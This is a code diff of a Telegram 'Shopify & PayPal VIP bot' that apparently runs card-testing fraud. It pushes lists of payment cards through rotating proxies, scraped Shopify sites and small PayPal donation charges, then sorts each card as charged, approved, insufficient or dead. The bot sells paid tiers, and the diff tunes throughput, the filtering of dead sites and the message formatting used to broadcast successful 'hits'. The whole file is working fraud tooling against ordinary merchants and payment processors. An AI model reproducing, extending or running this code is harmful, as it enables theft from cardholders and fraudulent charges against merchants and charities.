@@ -1,6 +1,6 @@
 # ==============================================================================
 # 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 & 𝐏𝐀𝐘𝐏𝐀𝐋 𝐕𝐈𝐏 𝐁𝐎𝐓 - 𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐏𝐑𝐎𝐃𝐔𝐂𝐓𝐈𝐎𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 
-# (CUSTOM ANIMATED EMOJIS, CHARGED FONT, ASYNC PAYPAL 1$, STRICT EXACT RESPONSES)
+# (SMART SITE ROTATION, FORCED GIF DOWNLOADER, CHARGED FONT, ASYNC PAYPAL)
 # ==============================================================================
 import asyncio
 import aiohttp
@@ -17,7 +17,7 @@ import sys
 from html import unescape
 from datetime import datetime, timedelta
 from urllib.parse import urlparse
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaAnimation
 from telegram.ext import Application, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 from telegram.error import RetryAfter, Conflict, TimedOut, NetworkError, Forbidden, BadRequest
 from telegram.constants import ParseMode
@@ -69,13 +69,13 @@ CHECKER_API_URL = 'https://autosh.up.railway.app/shopii'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
-WORKERS = 40  
+WORKERS = 15  
 API_TIMEOUT = 30  
-DELAY = 2.5  
-HIT_DELAY = 1.0
+DELAY = 1.0  
+HIT_DELAY = 0.2
 
 _SITE_ERRORS_COUNT = {}
-_MAX_SITE_ERRORS = 4
+_MAX_SITE_ERRORS = 3
 _JOIN_CACHE = {}
 _MAINTENANCE_MODE = False
 
@@ -86,7 +86,6 @@ PENDING_FILES = {}
 
 # ====================== SAFE CHARGED FONT ENGINE & TAG PROTECTION ======================
 def sf(text) -> str:
-    """Converts English letters/Numbers to Sans-Serif Bold while skipping internal HTML tags safely."""
     if text is None: return ""
     res = ""
     in_tag = False
@@ -110,7 +109,6 @@ def sf(text) -> str:
     return res
 
 def unsf(text) -> str:
-    """Reverts Mathematical Sans-Serif Bold back to standard ASCII for database checking"""
     if text is None: return ""
     res = ""
     for c in str(text):
@@ -125,14 +123,14 @@ def escape_html(text):
     if not text: return "Unknown"
     return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
 
-# ====================== USER REQUESTED PREMIUM ANIMATED EMOJIS ======================
+# ====================== PREMIUM EMOJIS ======================
 CE_STAR = '<tg-emoji emoji-id="6201647288947839133">⭐</tg-emoji>'
 CE_FIRE = '<tg-emoji emoji-id="5445189224682779974">🔥</tg-emoji>'
 CE_GEAR = '<tg-emoji emoji-id="5445358884480916784">⚙️</tg-emoji>'
 CE_ROCKET = '<tg-emoji emoji-id="5445163772706582819">🚀</tg-emoji>'
 CE_TIME = '<tg-emoji emoji-id="5447311106030726740">⏱</tg-emoji>'
 
-# ====================== 250+ COUNTRIES FLAGS ALGORITHM ======================
+# ====================== FLAGS ======================
 ALL_COUNTRY_CODES = ["AD","AE","AF","AG","AI","AL","AM","AO","AQ","AR","AS","AT","AU","AW","AX","AZ","BA","BB","BD","BE","BF","BG","BH","BI","BJ","BL","BM","BN","BO","BQ","BR","BS","BT","BV","BW","BY","BZ","CA","CC","CD","CF","CG","CH","CI","CK","CL","CM","CN","CO","CR","CU","CV","CW","CX","CY","CZ","DE","DJ","DK","DM","DO","DZ","EC","EE","EG","EH","ER","ES","ET","FI","FJ","FK","FM","FO","FR","GA","GB","GD","GE","GF","GG","GH","GI","GL","GM","GN","GP","GQ","GR","GS","GT","GU","GW","GY","HK","HM","HN","HR","HT","HU","ID","IE","IL","IM","IN","IO","IQ","IR","IS","IT","JE","JM","JO","JP","KE","KG","KH","KI","KM","KN","KP","KR","KW","KY","KZ","LA","LB","LC","LI","LK","LR","LS","LT","LU","LV","LY","MA","MC","MD","ME","MF","MG","MH","MK","ML","MM","MN","MO","MP","MQ","MR","MS","MT","MU","MV","MW","MX","MY","MZ","NA","NC","NE","NF","NG","NI","NL","NO","NP","NR","NU","NZ","OM","PA","PE","PF","PG","PH","PK","PL","PM","PN","PR","PS","PT","PW","PY","QA","RE","RO","RS","RU","RW","SA","SB","SC","SD","SE","SG","SH","SI","SJ","SK","SL","SM","SN","SO","SR","SS","ST","SV","SX","SY","SZ","TC","TD","TF","TG","TH","TJ","TK","TL","TM","TN","TO","TR","TT","TV","TW","TZ","UA","UG","UM","US","UY","UZ","VA","VC","VE","VG","VI","VN","VU","WF","WS","YE","YT","ZA","ZM","ZW"]
 COUNTRY_FLAGS = {code: chr(ord(code[0]) + 127397) + chr(ord(code[1]) + 127397) for code in ALL_COUNTRY_CODES}
 
@@ -213,7 +211,19 @@ def get_cc_limit(plan, uid=0):
 def is_paid_plan(plan):
     return plan and plan.lower() in [p.lower() for p in PAID_TIERS]
 
-# ====================== STABILIZED GIF ENGINE ======================
+# ====================== BULLETPROOF GIF DOWNLOADER & ENGINE ======================
+async def fetch_gif_bytes(url):
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url, timeout=10) as resp:
+                if resp.status == 200:
+                    bio = io.BytesIO(await resp.read())
+                    bio.name = "animation.gif"
+                    return bio
+    except Exception as e:
+        logger.error(f"Failed to fetch GIF from {url}: {e}")
+    return None
+
 async def styled_reply(update: Update, text: str, buttons=None, use_gif=True, specific_gif=None):
     markup = InlineKeyboardMarkup(buttons) if buttons else None
     target = update.callback_query.message if update.callback_query else update.message
@@ -223,24 +233,32 @@ async def styled_reply(update: Update, text: str, buttons=None, use_gif=True, sp
         url = specific_gif or random.choice(ANIME_GIFS)
         media_to_send = _GIF_FILE_IDS.get(url, url)
         
-        for _ in range(3):
-            try: 
-                msg = await target.reply_animation(
-                    animation=media_to_send, 
-                    caption=text, 
-                    reply_markup=markup, 
-                    parse_mode=ParseMode.HTML,
-                    read_timeout=30,
-                    write_timeout=30,
-                    connect_timeout=30
-                )
-                if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
-                    _GIF_FILE_IDS[url] = msg.animation.file_id
-                return msg
-            except RetryAfter as e:
-                await asyncio.sleep(e.retry_after + 1)
-            except Exception:
-                await asyncio.sleep(1)
+        try: 
+            msg = await target.reply_animation(
+                animation=media_to_send, 
+                caption=text, 
+                reply_markup=markup, 
+                parse_mode=ParseMode.HTML,
+                read_timeout=20,
+                write_timeout=20
+            )
+            if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
+                _GIF_FILE_IDS[url] = msg.animation.file_id
+            return msg
+        except Exception:
+            gif_io = await fetch_gif_bytes(url)
+            if gif_io:
+                try:
+                    msg = await target.reply_animation(
+                        animation=gif_io,
+                        caption=text,
+                        reply_markup=markup,
+                        parse_mode=ParseMode.HTML
+                    )
+                    if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
+                        _GIF_FILE_IDS[url] = msg.animation.file_id
+                    return msg
+                except Exception: pass
 
     try: 
         return await target.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
@@ -262,25 +280,34 @@ async def styled_send(bot, chat_id, text, buttons=None, use_gif=True, specific_g
         url = specific_gif or random.choice(ANIME_GIFS)
         media_to_send = _GIF_FILE_IDS.get(url, url)
         
-        for _ in range(3):
-            try: 
-                msg = await bot.send_animation(
-                    chat_id=chat_id, 
-                    animation=media_to_send, 
-                    caption=text, 
-                    reply_markup=markup, 
-                    parse_mode=ParseMode.HTML,
-                    read_timeout=30,
-                    write_timeout=30,
-                    connect_timeout=30
-                )
-                if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
-                    _GIF_FILE_IDS[url] = msg.animation.file_id
-                return msg
-            except RetryAfter as e:
-                await asyncio.sleep(e.retry_after + 1)
-            except Exception:
-                await asyncio.sleep(1)
+        try: 
+            msg = await bot.send_animation(
+                chat_id=chat_id, 
+                animation=media_to_send, 
+                caption=text, 
+                reply_markup=markup, 
+                parse_mode=ParseMode.HTML,
+                read_timeout=20,
+                write_timeout=20
+            )
+            if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
+                _GIF_FILE_IDS[url] = msg.animation.file_id
+            return msg
+        except Exception:
+            gif_io = await fetch_gif_bytes(url)
+            if gif_io:
+                try:
+                    msg = await bot.send_animation(
+                        chat_id=chat_id,
+                        animation=gif_io,
+                        caption=text,
+                        reply_markup=markup,
+                        parse_mode=ParseMode.HTML
+                    )
+                    if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
+                        _GIF_FILE_IDS[url] = msg.animation.file_id
+                    return msg
+                except Exception: pass
 
     try: 
         return await bot.send_message(chat_id=chat_id, text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
@@ -348,9 +375,17 @@ async def get_github_sites():
         except Exception: pass
     return _CACHED_SITES
 
+# ====================== SMART SITE DEAD FILTER ======================
 def is_dead_site_error(err):
     if not err: return True
-    return any(k in str(err).lower() for k in ('receipt id is empty', 'handle is empty', 'product id is empty', 'cloudflare', 'connection failed', 'timed out', 'empty reply from server', 'bad gateway', 'service unavailable', 'gateway timeout', 'site dead', 'proxy dead', 'session_error'))
+    e = str(err).lower()
+    bad_keywords = [
+        'step 0', 'step 0 failed', 'step 10 failed', 'max ret', 'step0', 'incompatible', 
+        'receipt id is empty', 'handle is empty', 'product id is empty', 'cloudflare', 
+        'connection failed', 'timed out', 'empty reply from server', 'bad gateway', 
+        'service unavailable', 'gateway timeout', 'site dead', 'proxy dead', 'session_error'
+    ]
+    return any(k in e for k in bad_keywords)
 
 # ====================== SECURITY & FORCE JOIN ======================
 async def is_user_joined(uid, bot):
@@ -421,7 +456,7 @@ async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await styled_reply(update, f"<b>{CE_FIRE} {sf('Access Denied')}</b>\n\n├ {sf('You must join our official channels first.')}\n╰ {sf('Please join, then click Verify.')}", buttons=kb, use_gif=True)
     return False
 
-# ====================== ANTI-BAN PAYPAL API & RE-PARSING ENGINE ======================
+# ====================== STRICT API FILTERING ======================
 async def get_bin_info(bin_code):
     try:
         async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
@@ -453,9 +488,8 @@ async def check_paypal_donate_api(card, proxy):
             async with local_session.get(urll, headers=headers_get, proxy=proxy_str, timeout=20) as r1:
                 text1 = await r1.text()
 
-            # Catch About Home and Redirect Loops
             if r1.status != 200 or "<html" in text1.lower() and "callahan" not in text1.lower():
-                return {'status': 'Site Error', 'message': 'Gateway Layout Error (About Home Intercepted)', 'card': card, 'retry': True}
+                return {'status': 'Site Error', 'message': 'Gateway Layout Error (About Home)', 'card': card, 'retry': True}
 
             try:
                 vaa = re.search(r'name="give-form-hash" value="(.*?)"', text1).group(1)
@@ -517,34 +551,23 @@ async def check_paypal_donate_api(card, proxy):
                 try: j4 = await r4.json()
                 except: return {'status': 'Site Error', 'message': 'Final Layout Refused JSON', 'card': card, 'retry': True}
 
-            if j4.get("success") == True:
-                return {'status': 'Charged', 'message': 'Charged', 'card': card, 'gateway': 'PayPal (1$)', 'price': '1$'}
-            
-            text = str(j4)
-            status_msg = "card declined"
-            
-            try:
-                if "'data': {'error': ' " in text: status_msg = text.split("'data': {'error': ' ")[1].split('.')[0]
-                elif "'details': [{'issue': '" in text: status_msg = text.split("'details': [{'issue': '")[1].split("'")[0]
-                elif "issuer is not certified. " in text: status_msg = text.split("issuer is not certified. ")[1].split('.')[0]
-                elif "system is unavailable.  " in text: status_msg = text.split("system is unavailable. ")[1].split('.')[0]
-                elif "C does not match. " in text: status_msg = text.split("not match. ")[1].split('.')[0]
-                elif "service is not supported. " in text: status_msg = text.split("service is not supported. ")[1].split('.')[0]
-                elif "'data': {'error': '" in text: status_msg = text.split("'data': {'error': '")[1].split('.')[0]
-            except Exception: pass
+            text = str(j4).lower()
 
-            rl = status_msg.lower()
-            
-            if 'insufficient' in rl or 'not enough' in rl or 'balance' in rl or 'funds' in rl:
+            if 'insufficient' in text or 'not enough' in text or 'balance' in text or 'funds' in text:
                 return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': 'PayPal (1$)', 'price': '1$'}
-            elif '3d' in rl or 'secure' in rl or 'challenge' in rl or 'verification' in rl or 'otp' in rl:
+            
+            if '3d' in text or 'secure' in text or 'challenge' in text or 'verification' in text or 'otp' in text:
                 return {'status': 'Approved', 'message': '3d_secure_required', 'card': card, 'gateway': 'PayPal (1$)', 'price': '1$'}
-            elif 'cvv' in rl or 'cvc' in rl or 'zip' in rl or 'approved' in rl or 'security code' in rl or 'not match' in rl:
+            if 'cvv' in text or 'cvc' in text or 'zip' in text or 'approved' in text or 'security code' in text or 'not match' in text:
                 return {'status': 'Approved', 'message': 'approved', 'card': card, 'gateway': 'PayPal (1$)', 'price': '1$'}
-            elif 'rate_limit' in rl or 'unavailable' in rl:
+            
+            if 'rate_limit' in text or 'unavailable' in text or 'error' in text:
                 return {'status': 'Site Error', 'message': 'card declined', 'card': card, 'retry': True, 'gateway': 'PayPal (1$)', 'price': '1$'}
-            else:
-                return {'status': 'Dead', 'message': 'card declined', 'card': card, 'gateway': 'PayPal (1$)', 'price': '1$'}
+
+            if j4.get("success") == True or 'completed' in text or 'succeeded' in text:
+                return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': 'PayPal (1$)', 'price': '1$'}
+
+            return {'status': 'Dead', 'message': 'card declined', 'card': card, 'gateway': 'PayPal (1$)', 'price': '1$'}
 
     except asyncio.TimeoutError:
         return {'status': 'Site Error', 'message': 'Connection Timeout', 'card': card, 'retry': True}
@@ -569,25 +592,27 @@ async def check_card_api(card, site, proxy, session, gateway_name):
         pr = rj.get('Price', '-')
         gt = rj.get('Gateway', gateway_name)
         st = str(rj.get('Status', '')).strip().lower()
-        
-        if is_dead_site_error(rm): return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
-        
         rl = rm.lower()
         
-        if st == 'true' or 'success' in rl or 'charged' in rl or 'order completed' in rl or '💎' in rm or 'thank you' in rl or 'payment successful' in rl: 
-            return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
-        if 'cloudflare bypass failed' in rl: 
-            return {'status': 'Site Error', 'message': 'Cloudflare active', 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
-        if 'insufficient_funds' in rl or 'insufficient funds' in rl: 
-            return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+        if is_dead_site_error(rm):
+            return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
+        
+        if 'cloudflare bypass failed' in rl or any(k in rl for k in ['proxy', 'timeout', 'error', 'session', 'failed', 'unavailable', 'dead']):
+            return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
+
+        if 'insufficient' in rl or 'funds' in rl or 'balance' in rl or 'not enough' in rl or 'low balance' in rl:
+            return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': gt, 'price': pr}
+
         if '3d' in rl or 'secure' in rl or 'challenge' in rl or 'verification' in rl or 'otp' in rl:
             return {'status': 'Approved', 'message': '3d_secure_required', 'card': card, 'gateway': gt, 'price': pr}
-        if 'approved' in rl or any(k in rl for k in ['invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 'incorrect_zip']): 
+        if 'approved' in rl or any(k in rl for k in ['invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 'incorrect_zip', 'match']): 
             return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
-        if any(k in rl for k in ['proxy', 'timeout', 'error', 'session', 'failed']): 
-            return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
+
+        if st == 'true' or 'success' in rl or 'charged' in rl or 'order completed' in rl or '💎' in rm or 'thank you' in rl or 'payment successful' in rl: 
+            return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': gt, 'price': pr}
             
         return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+        
     except asyncio.TimeoutError: 
         return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
     except Exception as e: 
@@ -603,9 +628,13 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, max
             s = "PayPal" 
         else:
             acs = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS]
-            if not acs: _SITE_ERRORS_COUNT.clear(); acs = sites
+            if not acs: 
+                _SITE_ERRORS_COUNT.clear(); acs = sites
             s = random.choice(acs)
             r = await check_card_api(card, s, p, session, gateway_name)
+            
+            if r.get('status') == 'Site Error':
+                _SITE_ERRORS_COUNT[s] = _SITE_ERRORS_COUNT.get(s, 0) + 1
             
         if not r.get('retry'):
             if gateway_name != "PayPal" and r.get('status') in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
@@ -616,14 +645,12 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, max
     if lr: return {'status': 'Dead', 'message': f'{str(lr["message"])[:40]}', 'card': card, 'gateway': gateway_name, 'price': lr.get('price', '-')}
     return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': gateway_name, 'price': '-'}
 
-def format_card_result(status, card, gateway, response, price="-", bin_info=None, elapsed=0.0):
+# ====================== RESULTS FORMATTER ENGINE (STANDARD ASCII CC FORMAT) ======================
+def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
     bi = bin_info or {}
     ps = sf(f"${str(price).replace('$', '')}") if price and price != "-" else sf("-")
     
-    if status == "Charged": h = f"<b>{CE_STAR} {sf('CHARGED SUCCESSFULLY')}</b>"
-    elif status == "Approved": h = f"<b>{CE_ROCKET} {sf('APPROVED CVV')}</b>"
-    elif status == "Insufficient": h = f"<b>{CE_FIRE} {sf('INSUFFICIENT FUNDS')}</b>"
-    else: h = f"<b>{CE_FIRE} {sf('DECLINED')}</b>"
+    h = f"<b>{CE_STAR} {sf('PAYMENT SUCCEEDED')}</b>"
     
     country_code = str(bi.get('country_code', '')).strip()
     flag = get_flag_emoji(country_code) if country_code else "🏳️"
@@ -631,9 +658,9 @@ def format_card_result(status, card, gateway, response, price="-", bin_info=None
     
     return f"""{h}
 
-<b>{CE_STAR} {sf('Card')}:</b> <code>{sf(card)}</code>
+<b>{CE_STAR} {sf('Card')}:</b> <code>{card}</code>
 
-<b>{CE_FIRE} {sf('Response')}:</b> <code>{sf(response)}</code>
+<b>{CE_FIRE} {sf('Response')}:</b> <code>{sf('Payment Succeeded')}</code>
 
 <b>{CE_ROCKET} {sf('Gateway')}:</b> <code>{sf(gateway)}</code>
 <b>{CE_STAR} {sf('Price')}:</b> <code>{ps}</code>
@@ -646,8 +673,8 @@ def format_card_result(status, card, gateway, response, price="-", bin_info=None
 
 <b>{CE_TIME} {sf('Took')}:</b> <code>{sf(f'{elapsed:.2f}s')}</code>"""
 
-async def _send_global_hit(status, gateway, message, price, uid, bot, elapsed):
-    if not HITS_GROUP_TARGET or status != "Charged": return
+async def _send_global_hit(gateway, price, uid, bot, elapsed):
+    if not HITS_GROUP_TARGET: return
     try:
         user_name = _USER_NAMES.get(uid, f"User {uid}")
         safe_name = escape_html(sf(user_name))
@@ -655,18 +682,27 @@ async def _send_global_hit(status, gateway, message, price, uid, bot, elapsed):
         plan_name = plan.title() if plan else "Free"
         ps = f" {sf(f'${str(price).replace('$', '')}')}" if price and str(price) != "-" else ""
         
-        h = f"<b>{CE_STAR} {sf('CHARGED SUCCESSFULLY')}</b>"
+        h = f"<b>{CE_STAR} {sf('PAYMENT SUCCEEDED')}</b>"
         
         text = f"""{h}
 
 <b>{CE_ROCKET} {sf('Gateway')}:</b> <code>{sf(gateway)}</code>{ps}
-<b>{CE_FIRE} {sf('Response')}:</b> <code>{sf(message)}</code>
+<b>{CE_FIRE} {sf('Response')}:</b> <code>{sf('Payment Succeeded')}</code>
 <b>{CE_TIME} {sf('Took')}:</b> <code>{sf(f'{elapsed:.2f}s')}</code>
 <b>{CE_STAR} {sf('User')}:</b> <a href="tg://user?id={uid}">{safe_name}</a> (<code>{sf(plan_name)}</code>)"""
 
         try: cid = int(HITS_GROUP_TARGET)
         except ValueError: cid = HITS_GROUP_TARGET
         await bot.send_message(chat_id=cid, text=text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+    except Exception: pass
+
+async def _send_mass_hit(card, gateway, price, uid, elapsed, bot):
+    await asyncio.sleep(HIT_DELAY)
+    try:
+        bi = await get_bin_info(card.split("|")[0])
+        msg = format_card_result(card, gateway, price, bi, elapsed)
+        kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt", style="primary")]]
+        await styled_send(bot, uid, msg, buttons=kb, use_gif=True)
     except Exception: pass
 
 # ====================== CENTRALIZED CORE ROUTER ======================
@@ -1134,8 +1170,8 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                     
                     if status == 'Charged':
                         chg += 1
-                        asyncio.create_task(_send_mass_hit(card, "Charged", res.get('message', ''), res.get('price', '-'), gate_name, uid, c_el, bot))
-                        asyncio.create_task(_send_global_hit("Charged", gate_name, res.get('message', ''), res.get('price', '-'), uid, bot, c_el))
+                        asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot))
+                        asyncio.create_task(_send_global_hit(gate_name, res.get('price', '-'), uid, bot, c_el))
                     elif status == 'Approved':
                         app += 1
                     elif status == 'Insufficient':
@@ -1177,15 +1213,6 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     except Exception: pass
     process_store.pop(uid, None)
     await cleanup_user_http_session(uid)
-
-async def _send_mass_hit(card, status, message, price, gateway, uid, elapsed, bot):
-    await asyncio.sleep(HIT_DELAY)
-    try:
-        bi = await get_bin_info(card.split("|")[0])
-        msg = format_card_result(status, card, gateway, message, price, bi, elapsed)
-        kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt", style="primary")]]
-        await styled_send(bot, uid, msg, buttons=kb, use_gif=True)
-    except Exception: pass
 
 async def stop_chk_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
